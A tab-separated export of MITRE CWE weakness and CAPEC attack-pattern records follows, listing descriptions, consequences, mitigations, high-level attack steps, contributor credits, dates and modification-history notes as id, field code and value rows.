15862	62	updated Demonstrative_Examples
8519	101	CAPEC Content Team
13530	102	ChildOf
5864	62	updated Relationships, Taxonomy_Mappings
13866	44	SOAR Partial
17003	63	Bypass Protection Mechanism
17632	72	Execution may end due to a memory access error.
15665	39	2008-08-01
20620	62	updated Relationships, Taxonomy_Mappings
20997	67	Low
21008	35	MITRE
5655	91	Implementation
21796	35	MITRE
10646	90	Language-Independent
19252	31	1000
15121	46	Thread management in a web application is forbidden by the J2EE standard in some circumstances and is always highly error prone. Managing threads is difficult and is likely to interfere in unpredictable ways with the behavior of the application container. Even without interfering with the container, thread management usually leads to bugs that are hard to detect and diagnose like deadlock, race conditions, and other synchronization errors.
25288	45	Base
10193	40	The target application must fail to adequately sanitize HTML attributes against the presence of dangerous commands.
12575	35	MITRE
19424	79	Integrity
8972	76	2019-04-04
22652	39	2008-09-08
6761	39	2008-09-08
23855	35	MITRE
16655	62	updated Relationships
9164	62	updated Demonstrative_Examples, Relationships
8032	35	MITRE
15425	86	http://jeremiahgrossman.blogspot.com/2010/07/third-party-web-widget-security-faq.html
6817	79	Authorization
10603	45	Variant
17625	35	MITRE
7857	92	Experiment
10201	45	Variant
7136	62	updated Relationships
22424	33	Jim Manico
21939	76	2017-01-09
9543	62	updated Potential_Mitigations
14107	69	Draft
21079	90	C
22744	40	The system allows users to recover their passwords and gain access back into the system.
24970	32	IBM Rational Application Security Group
22623	45	Variant
23465	90	C
11804	39	2009-05-27
11552	27	A tool capable of sending and receiving packets from a remote system.
11214	90	Language-Independent
23848	31	1000
23263	89	Meta
25230	88	Not Using Complete Mediation
17355	88	Improper Neutralization of Section Delimiters
7380	28	CWE Content Team
22317	28	CWE Content Team
17107	27	A client application capable of interacting with the DNS server or a command-line utility or web application that automates DNS interactions.
13156	62	updated Relationships
22926	62	updated Potential_Mitigations
13247	69	Incomplete
13504	76	2015-11-09
24650	62	updated Potential_Mitigations
23470	90	Language-Independent
11445	62	updated References, Relationships, Taxonomy_Mappings
19687	21	PLOVER
17490	35	MITRE
20525	48	11
9586	45	Class
24615	39	2010-02-16
14263	63	Modify Memory
24174	28	CWE Content Team
19269	23	An attacker creates a false but functional session credential in order to gain or usurp access to a service. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. If an attacker is able to forge valid session credentials they may be able to bypass authentication or piggy-back off some other authenticated user's session. This attack differs from Reuse of Session IDs and Session Sidejacking attacks in that in the latter attacks an attacker uses a previous or existing credential without modification while, in a forging attack, the attacker must create their own credential, although it may be based on previously observed credentials.
12637	50	Design: Use FAT file systems which do not support Alternate Data Streams.
14574	62	updated Demonstrative_Examples, Related_Attack_Patterns
22143	62	updated Causal_Nature, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings
18624	28	CWE Content Team
18114	28	CWE Content Team
6909	35	MITRE
23792	28	CWE Content Team
22305	95	[Understand How to Request JSON Responses from the Target System] An attacker first explores the target system to understand what URLs need to be provided to it in order to retrieve JSON objects that contain information of interest to the attacker.
12990	39	2013-02-21
23133	62	updated Relationships, Taxonomy_Mappings
24249	28	CWE Content Team
20639	28	CWE Content Team
9615	62	updated Potential_Mitigations
16247	86	https://developer.apple.com/library/mac/#documentation/security/conceptual/SecureCodingGuide/Articles/AccessControl.html
24588	46	If the EJB deployment descriptor contains one or more method permissions that grant access to the special ANYONE role, it indicates that access control for the application has not been fully thought through or that the application is structured in such a way that reasonable access control restrictions are impossible.
6771	90	Language-Independent
10709	72	Disabling the validation framework for a form exposes the application to numerous types of attacks. Unchecked input is the root cause of vulnerabilities like cross-site scripting, process control, and SQL injection.
21634	39	2009-10-29
20533	63	Read Application Data
24109	35	MITRE
14814	90	Language-Independent
17435	100	The MITRE Corporation
18208	92	Exploit
12065	46	Improperly handled case sensitive data can lead to several possible consequences, including:                                                case-insensitive passwords reducing the size of the key space, making brute force attacks easier                   bypassing filters or access controls using alternate names                   multiple interpretation errors using alternate names.
12343	26	Implementation
23680	62	updated Demonstrative_Examples
12874	21	PLOVER
9116	104	104
10190	83	First Edition
5606	91	System Configuration
7696	47	Execute Unauthorized Commands
10488	90	C++
23666	88	Truncation of Security-relevant Information
11541	28	CWE Content Team
6228	62	updated Other_Notes
16913	33	Nelson Elhage
20687	59	Updated Related_Weaknesses
18495	43	Simple
9825	103	Primary
23042	85	461
9159	44	SOAR Partial
16154	39	2012-05-11
21515	102	ChildOf
17008	91	Implementation
21853	28	CWE Content Team
21338	103	Primary
23011	35	MITRE
12234	56	ChildOf
11601	76	2018-07-31
8904	76	2019-09-30
9639	35	MITRE
18743	46	Virtual file names are represented like normal file names, but they are effectively aliases for other resources that do not behave like normal files. Depending on their functionality, they could be alternate entities. They are not necessarily listed in directories.
24153	35	MITRE
20066	61	Draft
6674	62	updated Potential_Mitigations, Time_of_Introduction
19301	39	2011-06-01
11630	31	699
19601	35	MITRE
8763	103	Primary
14326	63	DoS: Resource Consumption (CPU)
23876	81	Confidentiality
23249	23	When trying to keep information confidential, an attacker can often infer some of the information by using statistics.
18123	39	2012-05-11
15081	42	Do not rely exclusively on sanity checks of file contents to ensure that the file is of the expected type and size. It may be possible for an attacker to hide code in some file segments that will still be executed by the server. For example, GIF images may contain a free-form comments field.
20029	39	2008-09-08
5903	35	MITRE
15943	26	Architecture and Design
25074	79	Access Control
16920	31	699
16124	62	updated Potential_Mitigations
9629	79	Confidentiality
10036	90	Language-Independent
19932	63	Gain Privileges or Assume Identity
16695	39	2012-10-30
21079	23	The software does not correctly calculate the length of strings that can contain wide or multi-byte characters.
11184	26	Implementation
19173	39	2009-10-29
23941	91	Installation
20300	62	updated Description, Relationships, Relationship_Notes, Relevant_Properties, Taxonomy_Mappings
11519	91	Architecture and Design
22509	28	CWE Content Team
22360	91	Implementation
20349	91	Architecture and Design
13851	95	[Exploit the target] Craft malicious content containing XPath expressions that is not validated by the application and is executed as part of the XPath queries.
5808	21	PLOVER
15128	39	2008-07-01
25290	88	Password in Configuration File
17844	91	Operation
7032	42	Be familiar with the device names in the operating system where your system is deployed. Check input for these device names.
19332	35	MITRE
20459	40	HTTP is used as the communication protocol between the server and the client
14930	72	Since the file is visible and the application which is using the temp file could be known, the attacker has gained information about what the user is doing at that time.
10663	62	updated Relationships, Other_Notes, Taxonomy_Mappings
10943	28	CWE Content Team
21139	45	Base
21558	28	CWE Content Team
23554	76	2019-09-30
23121	35	Cigital
9291	35	MITRE
15210	26	Implementation
6297	56	PeerOf
12539	78	Very High
21109	46	As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.
16108	101	CAPEC Content Team
24477	35	Cigital
18639	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Configuration Checker
8918	35	MITRE
21285	45	Class
24841	104	223
10741	62	updated Name, Potential_Mitigations, Time_of_Introduction
24735	45	Base
14578	28	CWE Content Team
22095	61	Draft
20318	88	Non-Replicating Malicious Code
18519	39	2011-09-13
21139	90	Language-Independent
11897	23	An attack of this type exploits the host's trust in executing remote content, including binary files. The files are poisoned with a malicious payload (targeting the file systems accessible by the target software) by the adversary and may be passed through standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes. Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the adversary knows the standard handling routines and can identify vulnerabilities and entry points, they can be exploited by otherwise seemingly normal content. Once the attack is executed, the adversary's program can access relative directories such as C:\Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus.
6499	42	Use a hash table instead of an alist.
25418	28	CWE Content Team
21982	85	145
24122	43	Simple
12795	62	updated Relationships
22491	26	Architecture and Design
16044	62	updated Relationships, Taxonomy_Mappings
19064	28	CWE Content Team
19991	100	The MITRE Corporation
23550	73	Use WebScarab to reveal hidden fields while browsing.
5828	91	Implementation
13974	39	2014-07-30
19313	23	Allowing a .NET application to run at potentially escalated levels of access to the underlying operating and file systems can be dangerous and result in various forms of attacks.
7933	103	Primary
9123	28	Eric Dalci
8866	89	Meta
18273	35	MITRE
21303	101	CAPEC Content Team
22801	91	Implementation
20472	31	1000
5679	23	A product acts as an intermediary or monitor between two or more endpoints, but it does not have a complete model of an endpoint's features, behaviors, or state, potentially causing the product to perform incorrect actions based on this incomplete model.
14488	101	CAPEC Content Team
17910	35	Cigital
22509	62	updated Relationships, References, Taxonomy_Mappings
11042	39	2009-05-27
10583	39	2008-08-15
17224	28	CWE Content Team
23468	35	MITRE
19530	76	2017-08-04
24744	76	2017-08-04
16129	35	Cigital
15847	62	updated Related_Attack_Patterns, Relationships
21033	86	http://www.usenix.org/events/fast08/tech/tsafrir.html
18663	59	Updated Attack_Pattern, Description Summary
15140	35	MITRE
7815	39	2011-06-01
19512	31	699
20069	48	06
18864	96	2010-01-15
21272	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Observed_Examples, Other_Notes, Relationships, Type
21517	45	Base
11515	28	CWE Content Team
19692	97	TCP Xmas Scan
14267	62	Improved the White_Box_Definition
19900	35	MITRE
6875	31	1000
22959	95	[Determine which character encodings are accepted by the application/system] The attacker then needs to provide various character encodings to the application/system and determine which ones are accepted. The attacker will need to observe the application's/system's response to the encoded data to determine whether the data was interpreted properly.
14286	101	CAPEC Content Team
18451	91	Implementation
7947	35	MITRE
11989	28	CWE Content Team
14897	28	CWE Content Team
8880	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode Quality Analysis                            Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
18647	81	Confidentiality
9090	39	2008-09-08
10153	39	2010-09-27
8703	28	CWE Content Team
21658	35	MITRE
22033	39	2011-03-29
20451	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
5695	35	MITRE
20783	39	2014-07-30
21917	36	http://doc.cenzic.com/sadoc9x14ba847/CPL0001509.htm
22442	39	2011-09-13
13112	35	MITRE
15692	43	Simple
15537	62	updated Applicable_Platforms, Causal_Nature
22210	62	updated Demonstrative_Examples
12758	69	Draft
11960	91	Operation
10193	85	243
21481	28	CWE Content Team
23584	28	Eric Dalci
24973	28	CWE Content Team
9131	28	CWE Content Team
18613	88	Multiple Unlocks of a Critical Resource
23126	63	Quality Degradation
19150	61	Draft
13499	28	CWE Content Team
9396	21	PLOVER
8880	44	SOAR Partial
25424	26	Architecture and Design
14812	79	Confidentiality
21643	35	MITRE
25246	24	Purdue University
10436	101	CAPEC Content Team
19770	62	updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings
13636	101	CAPEC Content Team
23883	28	CWE Content Team
7349	39	2014-07-30
17436	39	2011-09-13
11370	39	2013-02-21
8115	89	Detailed
5986	101	CAPEC Content Team
20292	80	General computer knowledge about how applications are launched, how they interact with input/output, and how they are configured.
7033	63	DoS: Crash, Exit, or Restart
14138	73	Use a proxy tool to record all links visited during a manual traversal of the web application.
9079	42	Use redundant access rules on different choke points (e.g., firewalls).
7074	56	ChildOf
8098	51	2015-11-09
15775	43	Simple
16082	62	updated Relationships, Taxonomy_Mappings
7490	62	updated Common_Consequences
21762	28	CWE Content Team
8175	56	ChildOf
20181	63	Hide Activities
13688	26	Implementation
21454	53	The MITRE Corporation
16835	44	SOAR Partial
13347	39	2019-06-20
24485	28	CWE Content Team
6979	47	Read Data
24558	56	ChildOf
10351	39	2009-10-29
15539	62	updated Description
19481	39	2011-06-27
19876	46	This issue makes it more difficult to understand or maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
10463	89	Detailed
22545	31	1003
17033	51	2014-06-23
7740	35	MITRE
18262	28	CWE Content Team
22487	76	2018-07-31
15358	35	MITRE
24180	50	Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.
15146	95	[Verify ability to write to filesystem] The attacker verifies ability to write to the target host's file system.
24675	39	2017-05-03
20887	90	C++
20062	39	2017-01-19
9825	56	ChildOf
12279	28	CWE Content Team
17383	61	Draft
25370	39	2010-04-05
10046	50	Use salt when computing password hashes. That is, concatenate the salt (random bits) with the original password prior to hashing it.
18195	62	updated Common_Consequences, Relationships
6127	28	CWE Content Team
17124	62	updated Time_of_Introduction
22797	62	updated Relationships
18519	62	updated Relationships, Taxonomy_Mappings
13868	35	MITRE
20073	33	Robert Auger
17922	62	updated Demonstrative_Examples
22006	79	Access Control
17368	42	Use OS-level preventative functionality. Not a complete solution.
10053	39	2008-09-08
14220	62	updated Common_Consequences, Demonstrative_Examples, Relationships
22174	51	2014-06-23
23482	35	MITRE
12852	62	updated Relationships
17039	88	Authentication Bypass by Primary Weakness
11653	86	https://www.theverge.com/2017/4/12/15271874/ai-adversarial-images-fooling-attacks-artificial-intelligence
19885	56	ChildOf
15465	31	1000
10072	31	699
8236	39	2011-09-13
15579	39	2008-07-01
9156	62	updated Common_Consequences, Detection_Factors, Potential_Mitigations, References
9787	35	MITRE
14712	26	Architecture and Design
17620	28	CWE Content Team
7978	45	Base
13072	35	MITRE
15403	28	Eric Dalci
19195	100	The MITRE Corporation
17381	62	updated References, Relationships
23621	28	CWE Content Team
13279	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
12271	35	MITRE
22061	91	Implementation
5705	35	MITRE
23727	69	Draft
16558	100	The MITRE Corporation
21677	95	If the system does go into an insecure/inconsistent state, leverage that to obtain information about the system functionality or data, elevate access control, etc. The rest of this attack will depend on the context and the desired goal.
10487	35	MITRE
15931	62	updated Relationships, Taxonomy_Mappings
24255	39	2014-07-30
24234	89	Detailed
15441	26	Implementation
12457	56	CanPrecede
23820	62	updated Description, Relationships, Taxonomy_Mappings
15775	69	Draft
12959	73	Manually tampering email headers to inject malicious metacharacter-based payload content in them.
18723	28	CWE Content Team
22567	62	updated Relationships, Other_Notes, Taxonomy_Mappings
15113	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
14933	43	Simple
16317	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
18734	62	updated References, Relationships, Type
20586	51	2014-06-23
10899	56	ChildOf
8383	39	2012-05-11
14437	35	MITRE
9104	61	Draft
10102	35	MITRE
10508	104	598
20827	103	Primary
22883	46	This is often triggered by improper handling of malformed data or unexpectedly interrupted sessions.  In some languages, developers are responsible for tracking memory allocation and releasing the memory.  If there are no more pointers or references to the memory, then it can no longer be tracked and identified for release.
9263	51	2014-06-23
6956	39	2010-04-05
10831	39	2012-10-30
18742	31	1000
11011	100	The MITRE Corporation
20350	81	Confidentiality
11948	25	Low
22272	21	CWE Content Team
5662	80	Simple command line attacks or to inject the malicious payload in a web page.
8779	39	2008-08-01
15322	70	Deserialization of Untrusted Data
7581	60	01
24989	86	http://www.databasesecurity.com/dbsec/cursor-injection.pdf
14693	62	updated Description, Other_Notes, Potential_Mitigations
6273	28	CWE Content Team
18643	35	MITRE
23793	43	Simple
16129	62	updated Time_of_Introduction
15402	89	Detailed
21936	39	2012-05-11
7618	81	Availability
15050	40	The target must be running an XML based application that leverages DTDs.
8641	21	PLOVER
22536	78	Low
21057	35	MITRE
10295	28	CWE Content Team
12459	31	1000
17716	62	updated Common_Consequences, Relationships
8451	97	Using Alternative IP Address Encodings
11795	33	Mike Hamburg
21953	39	2010-12-13
8454	28	CWE Content Team
6750	39	2012-10-30
12052	24	MITRE
16997	91	Implementation
19096	56	ChildOf
22567	35	MITRE
17243	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
8466	39	2019-06-20
14986	77	Automated Static Analysis
14056	61	Draft
8003	86	http://software-security.sans.org/blog/2010/03/03/top-25-series-rank-4-cross-site-request-forgery
19791	62	updated Relationships, Taxonomy_Mappings
17269	28	CWE Content Team
6548	62	updated Time_of_Introduction
5860	62	updated Common_Consequences
6075	103	Primary
6488	91	Requirements
22067	35	MITRE
23882	103	Primary
23768	79	Confidentiality
13173	26	Implementation
14567	39	2017-11-08
7081	39	2012-10-30
23417	31	699
22327	79	Confidentiality
10741	28	Eric Dalci
25300	79	Authorization
20592	59	Updated Related_Attack_Patterns, Related_Weaknesses
11211	91	Implementation
22128	26	Implementation
11788	39	2010-12-13
22418	28	CWE Content Team
20625	39	2008-07-01
9639	39	2009-05-27
9346	97	Target Programs with Elevated Privileges
18686	62	updated Description, Other_Notes
6225	63	Varies by Context
12992	63	Gain Privileges or Assume Identity
19668	35	MITRE
7405	45	Variant
9200	85	474
13150	63	Execute Unauthorized Code or Commands
25416	101	CAPEC Content Team
18431	21	7 Pernicious Kingdoms
22110	79	Access Control
15925	62	updated Description, Name, Relationships
9218	35	MITRE
23068	35	MITRE
5789	62	updated Time_of_Introduction
8618	91	Architecture and Design
8789	35	MITRE
24202	39	2014-07-30
7586	62	updated Demonstrative_Examples
17973	97	Infiltration of Software Development Environment
7974	62	updated Relationships
8370	73	Leverage knowledge of common local zone functionality on targeted platforms to guide attempted injection of code through relevant internet zone mechanisms. In some cases this may be due to standard system configurations enabling shared functionality between internet and local zones. The attacker can search for indicators that these standard configurations are in place.
14328	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
14609	35	MITRE
22390	31	1000
14989	39	2008-09-08
18062	103	Primary
11024	25	Medium
24554	62	updated Description, Name
16964	39	2017-11-08
15293	28	CWE Content Team
23972	35	MITRE
20436	79	Integrity
20628	76	2018-07-31
16440	62	updated Description, Other_Notes, Relationship_Notes
7132	47	Hide Activities
8367	35	MITRE
18487	63	Reduce Reliability
10623	35	MITRE
6609	90	Language-Independent
20351	28	CWE Content Team
10021	35	MITRE
23869	62	updated Demonstrative_Examples, Potential_Mitigations
15376	63	Read Memory
20338	42	Use the appropriate type for the desired action. For example, in C/C++, only use unsigned types for values that could never be negative, such as height, width, or other numbers related to quantity. This will simplify sanity checks and will reduce surprises related to unexpected casting.
16009	62	updated Description
21831	39	2012-10-30
8456	47	Resource Consumption
14063	103	Primary
23044	85	1
7917	56	ChildOf
12842	26	Implementation
15447	54	Medium
7282	76	2017-08-04
14236	35	MITRE
17279	75	Without visibility into the code, black box methods may not be able to sufficiently distinguish this weakness from others, requiring manual methods to diagnose the underlying problem.
23340	26	Architecture and Design
22487	100	The MITRE Corporation
12136	35	MITRE
9671	46	Irrelevant code could include dead code,       initialization that is not used, empty blocks, code that could be entirely       removed due to optimization, etc.
9538	35	MITRE
17022	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
21201	39	2008-10-14
10658	28	CWE Content Team
16228	84	27
24108	35	MITRE
10448	35	MITRE
23199	62	updated Description
19887	28	CWE Content Team
21628	62	updated Taxonomy_Mappings
19185	56	ChildOf
6862	62	added/updated demonstrative examples
16102	28	CWE Content Team
17588	47	Execute Unauthorized Commands
18493	51	2014-06-23
17157	63	Other
23739	39	2008-09-08
6626	35	MITRE
16341	35	MITRE
22449	79	Authorization
20300	39	2008-09-08
14911	35	MITRE
10470	28	CWE Content Team
23097	89	Detailed
12126	56	ChildOf
20756	103	Primary
19405	81	Availability
8547	26	Architecture and Design
11199	39	2009-07-27
10042	90	Java
8506	39	2009-03-10
10778	28	CWE Content Team
19898	49	2005
21406	80	To modify file, deceive client into downloading, locate and exploit remote stack or heap vulnerability
13501	55	CAPEC Content Team
5655	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   For example, limiting filenames to alphanumeric characters can help to restrict the introduction of unintended file extensions.
15903	23	Every Action Form must have a corresponding validation form.
16352	28	CWE Content Team
16689	47	Gain Privileges
17213	62	updated Common_Consequences
9501	59	Updated @Abstraction
19794	72	When the resource is released, the software might modify some of its structure. This might affect program logic in the sections of code that still assume the resource is active. If the released resource is related to memory and is used in a function call, or points to unexpected data in a write operation, then code execution may be possible upon subsequent accesses.
17553	62	updated Relationship_Notes
16572	35	MITRE
7161	35	MITRE
20824	92	Experiment
19949	72	Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.
10397	31	1000
21130	35	MITRE
11801	81	Confidentiality
12718	23	Some web applications require users to submit information through an ordered sequence of web forms. This is often done if there is a very large amount of information being collected or if information on earlier forms is used to pre-populate fields or determine which additional information the application needs to collect. An attacker who knows the names of the various forms in the sequence may be able to explicitly type in the name of a later form and navigate to it without first going through the previous forms. This can result in incomplete collection of information, incorrect assumptions about the information submitted by the attacker, or other problems that can impair the functioning of the application.
23379	81	Confidentiality
6084	21	PLOVER
15317	95	The attacker tries to encode some special characters in the URL. The attacker finds out that some characters are not filtered properly.
9372	72	Potentially data could be tampered with by another function which should not have been tampered with.
6070	74	3
21455	39	2014-07-30
20820	61	Draft
7409	59	Updated Description Summary
16852	28	CWE Content Team
19041	97	Embedding Scripts within Scripts
12870	33	Douglas C. Schmidt
12110	100	The MITRE Corporation
5651	56	ChildOf
12958	90	Language-Independent
5627	86	http://software-security.sans.org/downloads/appsec-2011-files/manico-appsec-future-tools.pdf
11930	31	1003
21160	69	Draft
16043	36	http://msdn.microsoft.com/en-au/magazine/ff646973.aspx
17683	40	The target host insufficiently protects access to the logs or logging mechanisms.
7549	31	1000
6346	28	CWE Content Team
15509	31	1000
15500	42	Ensure that all protocols are strictly defined, such that all out-of-bounds behavior can be identified simply, and require strict conformance to the protocol.
14196	35	MITRE
22050	35	MITRE
16053	45	Base
19475	77	Manual Static Analysis
14621	28	CWE Content Team
25288	90	C++
16465	39	2011-06-01
16789	50	Design: Use libraries and templates that minimize unfiltered input.
11376	21	CLASP
6051	35	MITRE
14620	48	08
20162	81	Integrity
12374	56	ChildOf
23227	39	2008-08-15
13515	28	CWE Content Team
6545	62	updated Detection_Factors, Relationships, Other_Notes, Weakness_Ordinalities
8723	39	2011-06-01
18127	81	Integrity
18783	62	added/updated demonstrative examples
12491	76	2019-04-04
15134	51	2014-06-23
21119	23	The product performs a calculation to determine how much memory to allocate, but an integer overflow can occur that causes less memory to be allocated than expected, leading to a buffer overflow.
7673	35	MITRE
6872	46	In order to establish secure communication between two parties, it is often important to adequately verify the identity of entities at each end of the communication channel. Inadequate or inconsistent verification may result in insufficient or incorrect identification of either communicating entity. This can have negative consequences such as misplaced trust in the entity at the other end of the channel. An attacker can leverage this by interposing between the communicating entities and masquerading as the original entity. In the absence of sufficient verification of identity, such an attacker can eavesdrop and potentially modify the communication between the original entities.
22054	73	Use other techniques with debugging tools to replace the file between the time the application checks the file and the time the application opens it.
12120	40	Targeted software inadequately performs bounds-checking on buffer operations.
24157	35	MITRE
9707	56	ChildOf
18916	35	MITRE
18251	62	updated Relationships
11043	62	updated Type
17482	48	11
14689	35	MITRE
11368	51	2014-06-23
25261	39	2019-01-03
7859	85	75
14643	89	Standard
10197	35	MITRE
17377	35	MITRE
12523	42	Use a tool that dynamically detects memory management problems, such as valgrind.
12133	76	2015-11-09
22791	72	If privileges are not dropped, neither are access rights of the user. Often these rights can be prevented from being dropped.
21886	28	CWE Content Team
9937	21	CWE Content Team
13933	62	updated Time_of_Introduction
5911	39	2008-09-08
6912	23	An attacker exploits a cryptographic weakness in the signature verification algorithm implementation to generate a valid signature without knowing the key.
6722	28	CWE Content Team
13153	28	CWE Content Team
13376	79	Authorization
12063	102	ChildOf
23768	47	Gain Privileges
13241	28	CWE Content Team
8280	31	699
16215	55	CAPEC Content Team
14222	28	CWE Content Team
5736	62	updated Common_Consequences
23748	56	ChildOf
22009	90	Java
17210	71	2006
22122	59	Updated Activation_Zone, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns
24591	45	Base
23678	39	2009-07-27
8034	100	The MITRE Corporation
10280	73	The adversary sends several requests and records the timestamp values.
24079	97	Functionality Misuse
20177	23	This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the attacker finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables.
22543	60	25
19557	62	updated Demonstrative_Examples
5747	35	MITRE
17795	53	The MITRE Corporation
24450	61	Stable
20602	31	1000
14234	47	Unreliable Execution
24822	62	updated Relationships
16562	101	CAPEC Content Team
10133	62	updated Type
15684	73	Research popular or high traffic websites.
7059	35	MITRE
10097	56	ChildOf
24030	31	699
9934	54	Low
25077	39	2014-02-18
17556	39	2008-09-08
23099	56	ChildOf
25027	62	updated Common_Consequences
10419	62	updated Related_Attack_Patterns
22431	63	Read Application Data
16355	69	Draft
18380	62	updated Related_Attack_Patterns, Relationships
17217	28	CWE Content Team
7670	63	Varies by Context
10604	28	CWE Content Team
6929	104	755
7166	62	updated Demonstrative_Examples
10714	39	2015-12-07
8019	28	CWE Content Team
25271	28	CWE Content Team
20814	78	Low
6043	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner
11645	50	Use of parameterized XPath queries - Parameterization causes the input to be restricted to certain domains, such as strings or integers, and any input outside such domains is considered invalid and the query fails.
10507	35	Cigital
16751	81	Integrity
5765	35	MITRE
5620	59	Updated Description Summary
6371	63	Reduce Reliability
16009	28	CWE Content Team
22380	35	MITRE
7965	74	3
17653	39	2012-05-11
11494	35	MITRE
10928	62	updated Relationships
13982	76	2017-01-09
8226	39	2009-10-29
7506	28	Eric Dalci
13593	28	CWE Content Team
16860	35	MITRE
16604	72	An uncaught exception could cause the system to be placed in a state that could lead to a crash, exposure of sensitive information or other unintended behaviors.
8836	42	For any externally-influenced input, check the input against a white list of acceptable values.
22767	39	2013-07-17
9395	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
21252	39	2010-09-27
19057	26	Implementation
23467	35	MITRE
19439	95	[Optional: Explore legitimate website and create duplicate] An adversary creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that he or she is trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.
25427	62	updated Related_Attack_Patterns
20367	103	Primary
18678	33	Christopher Kruegel
14590	39	2014-07-30
17224	39	2010-06-21
8440	28	CWE Content Team
20507	62	updated Relationships, Taxonomy_Mappings
13845	100	The MITRE Corporation
19663	81	Integrity
21841	35	MITRE
18897	28	CWE Content Team
15388	28	Eric Dalci
12265	28	CWE Content Team
17985	39	2017-01-19
19658	59	Updated Related_Attack_Patterns
7116	91	Implementation
21960	62	updated Demonstrative_Examples, Potential_Mitigations
23886	62	updated Related_Attack_Patterns
23582	56	ChildOf
19583	60	21
15104	67	Medium
12833	39	2010-12-13
13962	66	Top 25 Series - Rank 9 - OS Command Injection
7338	57	Primary
17887	100	The MITRE Corporation
21448	35	MITRE
23164	35	Cigital
8864	56	ChildOf
19224	35	MITRE
15545	21	PLOVER
22719	56	ChildOf
21310	88	Information Exposure Through an External Behavioral Inconsistency
15547	35	MITRE
6471	50	Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.
21553	77	Dynamic Analysis with Manual Results Interpretation
20142	35	Cigital
22328	97	Reflection Attack in Authentication Protocol
16287	59	Updated Alternate_Terms
16652	28	CWE Content Team
16869	35	MITRE
15702	26	Implementation
7387	28	CWE Content Team
16679	101	CAPEC Content Team
19070	43	Simple
21091	31	1000
23923	62	updated Relationships, Taxonomy_Mappings
17328	63	Hide Activities
21391	28	CWE Content Team
19991	59	Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
25077	62	updated Applicable_Platforms, Description, Maintenance_Notes, Name, Observed_Examples, Other_Notes, References, Relationships, Research_Gaps
20230	31	699
24358	91	Architecture and Design
25095	103	Primary
22077	46	This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.             The '..\' manipulation is the canonical manipulation for operating systems that use "\" as directory separators, such as Windows. However, it is also useful for bypassing path traversal protection schemes that only assume that the "/" separator is valid.
16702	35	Cigital
7635	101	CAPEC Content Team
22558	39	2011-06-27
